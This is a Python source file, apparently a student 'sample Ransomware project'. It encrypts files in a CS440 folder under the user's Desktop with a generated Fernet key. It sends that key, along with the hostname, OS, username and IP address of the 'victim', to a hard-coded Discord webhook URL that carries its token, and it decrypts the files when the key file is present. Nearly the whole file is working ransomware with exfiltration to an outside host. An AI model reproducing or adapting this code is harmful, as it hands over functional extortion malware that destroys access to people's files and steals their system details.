import sys
import subprocess

def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

required_packages = ["subprocess", "sys", "argparse","os", "pathlib", "cryptography", "requests", "platform", "socket", "datetime"]
for package in required_packages:
    print(f"Checking for {package}")
    try:
        __import__(package)
    except ImportError:
        print(f"Package '{package}' not found. Installing...")
        install(package)


import argparse
import os
import pathlib
import requests
from cryptography.fernet import Fernet
import platform
import socket
from datetime import datetime

user_os = "Windows"
path_str = "\\"
computer_name = platform.node()
if (platform.system() == "Darwin" or platform.system() == "Linux"):
    user_os = platform.system()
    path_str = "/"

def has_onedrive():
    # Check common OneDrive paths
    local_onedrive_path = os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "OneDrive")
    user_onedrive_path = os.path.join(os.getenv("USERPROFILE"), "OneDrive")

    if os.path.exists(local_onedrive_path):
        print(f"OneDrive is installed at: {local_onedrive_path}")
        return True
    elif os.path.exists(user_onedrive_path):
        print(f"OneDrive is installed at: {user_onedrive_path}")
        return True
    else:
        print("OneDrive is not installed or not found.")
        return False


def navigateToDir(directory):
    location = str(pathlib.Path.home()) + path_str + directory
    if user_os == "Windows" and has_onedrive():
        location = str(pathlib.Path.home()) + path_str +'OneDrive' + path_str + directory

    print(location)
    try:
        os.chdir(location)
        print(f"Succesfully navigated to: {location}")
        return location
    except Exception as e:
        print(f"Error occurred: {e}")
    
    return None
    

def getFiles(directory):
    files = []

    for root, sd, files in os.walk(directory):
        if "CS440" in sd:
            path = os.path.join(root, "CS440")
            for cs440root, cs440sd, cs440files in os.walk(path):
                for file in cs440files:
                    files.append(os.path.join(path, file))
            break
            
    return files


def generateKey():
    key = Fernet.generate_key()
    with open("symmetric_key.key", "wb") as keyfile:
        keyfile.write(key)
    print("generated")
    send_key_to_discord(key)

def send_key_to_discord(key):
    # Replace with your Discord webhook URL
    discord_webhook_url = 'https://discord.com/api/webhooks/1294175755109924924/70hDsYAisH9sGSYJnXa3wr26vUcj-3X4cfVpTjwPtNAJWJq7cqtVSzKZWDuh9zxLW20n'

    #Collect system information
    computer_name = platform.node()  # Hostname
    user_os = platform.system()  # Operating System (Windows, Linux, Darwin)
    os_version = platform.version()  # OS Version
    current_user = os.getlogin()  # Username of the logged-in user
    ip_address = socket.gethostbyname(socket.gethostname())  # Victim's IP Address
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")  # Current Timestamp

    # Construct the payload with key and system info
    data = {
        "content": "Symmetric Key and Victim Info",
        "embeds": [{
            "title": "Encryption Details",
            "fields": [
                {"name": "Symmetric Key", "value": key.decode(), "inline": False},
                {"name": "Computer Name", "value": computer_name, "inline": True},
                {"name": "Operating System", "value": user_os, "inline": True},
                {"name": "OS Version", "value": os_version, "inline": True},
                {"name": "Current User", "value": current_user, "inline": True},
                {"name": "IP Address", "value": ip_address, "inline": True},
                {"name": "Timestamp", "value": timestamp, "inline": True}
            ]
        }]
    }

    # Send the data to the Discord webhook
    try:
        response = requests.post(discord_webhook_url, json=data)
        if response.status_code == 204:
            print("Symmetric key and victim info sent to Discord successfully.")
        else:
            print(f"Failed to send information to Discord. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error sending information to Discord: {e}")

def encrypt(target):
    with open(f"{pathlib.Path(__file__).parent.absolute()}/symmetric_key.key", "rb") as keyfile:
        key = keyfile.read()
    key = Fernet(key)
    
    if target:
        for doc in target:
            print(f"Filename is: {doc}")
            with open(doc, "rb") as file:
                original = file.read()
            cipher = key.encrypt(original) 

            with open(doc, "wb") as encrypted_file:
                encrypted_file.write(cipher)
        
        # os.remove(f'{pathlib.Path(__file__).parent.absolute()}/symmetric_key.key')
    else:
        print("Target empty.")


def decrypt(target, key_path):

    with open(key_path, "rb") as key_file:
        FernetKey = key_file.read()
        print(type(FernetKey))
    key = Fernet(FernetKey)

    for doc in target:
        print(f"Decrypting {doc}")
        with open(doc, "rb") as encrypted_file:
            cipher = encrypted_file.read()
        original = key.decrypt(cipher)
        with open(doc, "wb") as decrypted_file:
            decrypted_file.write(original)



def start_point():
    parser = argparse.ArgumentParser(prog='Ransomware', description='This is a sample Ransomware project.')
    args = parser.parse_args()


    file_path = f'{pathlib.Path(__file__).parent.absolute()}/symmetric_key.key'
    if os.path.isfile(file_path):
        print(f"Decrypting with {file_path}")
        directory = navigateToDir("Desktop"+ path_str +"Test")
        target = getFiles(directory)
        decrypt(target, file_path)
    else:
        print("Encrypting")
        generateKey()
        directory = navigateToDir("Desktop"+ path_str +"Test")
        target = getFiles(directory)
        encrypt(target)